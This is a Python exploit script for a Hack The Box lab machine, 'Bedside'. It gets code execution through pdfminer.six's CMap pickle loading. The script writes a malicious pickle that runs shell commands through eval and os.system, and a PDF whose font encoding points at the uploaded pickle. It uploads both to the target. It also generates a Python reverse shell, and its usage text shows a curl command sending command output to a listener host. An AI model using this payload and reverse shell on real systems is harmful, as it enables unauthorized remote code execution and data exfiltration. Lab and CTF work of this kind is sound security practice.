#!/usr/bin/env python3
"""
Bedside (HTB) — foothold: pdfminer.six CMap pickle RCE (CVE-2025-64512 style).

Flow:
  1) Build evil.pickle.gz (os.system / reverse shell / one-shot command)
  2) Build trigger PDF with Type0 /Encoding = PDF Name hex path
     to absolute: /var/www/research.bedside.htb/uploads/<stem>
     (stem without .pickle.gz)
  3) Upload both to research.bedside.htb (worker polls every ~30s, TIMEOUT 10s)

Usage:
  # reverse shell (backgrounded so pdf_watcher does not hang)
  python3 pdfminer_rce.py --mode revshell --lhost 10.10.14.x --lport 4444 \\
      --upload --target-ip 10.129.x.x

  # one-shot command (preferred for callbacks / plant)
  python3 pdfminer_rce.py --mode cmd --cmd 'id | curl -d @- http://LHOST:8888/' \\
      --upload --target-ip 10.129.x.x

  # only generate files
  python3 pdfminer_rce.py --mode cmd --cmd 'touch /tmp/pwned' --out-dir ./out --name drop1
"""
from __future__ import annotations

import argparse
import gzip
import os
import pickle
import sys
import time
from pathlib import Path
from urllib import request


UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"


def name_encoding(abs_stem: str) -> str:
    """PDF Name with / escaped as #2F (form that worked on the box)."""
    return "/" + "".join("#2F" if c == "/" else c for c in abs_stem)


def build_trigger_pdf(abs_stem: str) -> bytes:
    enc = name_encoding(abs_stem)
    # Minimal Type0 font with Encoding pointing at pickle CMap path
    pdf = f"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>endobj
4 0 obj<< /Length 20 >>stream
BT /F1 12 Tf (x) Tj ET
endstream
endobj
5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /M /Encoding {enc} /DescendantFonts [6 0 R] >>endobj
6 0 obj<< /Type /Font /Subtype /CIDFontType2 /BaseFont /M /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> /FontDescriptor 7 0 R >>endobj
7 0 obj<< /Type /FontDescriptor /FontName /M /Flags 4 /FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 0 /Descent 0 /CapHeight 0 /StemV 0 >>endobj
trailer<< /Root 1 0 R >>
%%EOF
"""
    return pdf.encode()


def build_pickle(cmd: str) -> bytes:
    # background so subprocess timeout in pdf_watcher does not block the loop forever
    wrapped = f"({cmd}) >/tmp/bedside_rce.log 2>&1 &"
    code = f"__import__('os').system({wrapped!r}) or {{}}"

    class RCE:
        def __reduce__(self):
            return (eval, (code,))

    return gzip.compress(pickle.dumps(RCE(), protocol=pickle.HIGHEST_PROTOCOL))


def revshell_cmd(lhost: str, lport: int) -> str:
    # python reverse; short enough to start under TIMEOUT
    return (
        f"python3 -c 'import socket,os,pty;s=socket.socket();"
        f's.connect(("{lhost}",{lport}));'
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f'pty.spawn("/bin/bash")\''
    )


def upload(path: Path, target_ip: str, vhost: str = "research.bedside.htb") -> int:
    boundary = "----BedsideBoundary7MA4YWxk"
    data = path.read_bytes()
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="uploadFile"; filename="{path.name}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = request.Request(
        f"http://{target_ip}/",
        data=body,
        method="POST",
        headers={
            "Host": vhost,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
    )
    with request.urlopen(req, timeout=30) as r:
        return r.status


def main() -> int:
    ap = argparse.ArgumentParser(description="Bedside pdfminer pickle RCE helper")
    ap.add_argument("--mode", choices=("cmd", "revshell"), default="cmd")
    ap.add_argument("--cmd", help="shell command (mode=cmd)")
    ap.add_argument("--lhost", help="listener IP (mode=revshell)")
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--name", default=None, help="upload basename without .pickle.gz")
    ap.add_argument("--out-dir", default=".")
    ap.add_argument("--upload", action="store_true")
    ap.add_argument("--target-ip", help="box IP for upload")
    ap.add_argument("--vhost", default="research.bedside.htb")
    args = ap.parse_args()

    if args.mode == "revshell":
        if not args.lhost:
            ap.error("--lhost required for revshell")
        cmd = revshell_cmd(args.lhost, args.lport)
    else:
        if not args.cmd:
            ap.error("--cmd required for mode=cmd")
        cmd = args.cmd

    name = args.name or f"drop{int(time.time())}"
    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)

    pkl = out / f"{name}.pickle.gz"
    pdf = out / f"{name}-trig.pdf"
    stem = f"{UPLOAD_DIR}/{name}"

    pkl.write_bytes(build_pickle(cmd))
    pdf.write_bytes(build_trigger_pdf(stem))
    print(f"[+] wrote {pkl} ({pkl.stat().st_size} B)")
    print(f"[+] wrote {pdf} Encoding → {stem}.pickle.gz")
    print(f"[+] payload cmd: {cmd[:120]}{'...' if len(cmd) > 120 else ''}")

    if args.upload:
        if not args.target_ip:
            ap.error("--target-ip required with --upload")
        for f in (pkl, pdf):
            code = upload(f, args.target_ip, args.vhost)
            print(f"[+] upload {f.name} → HTTP {code}")
        print("[*] worker is async (~30s). Start listener BEFORE upload for revshell.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
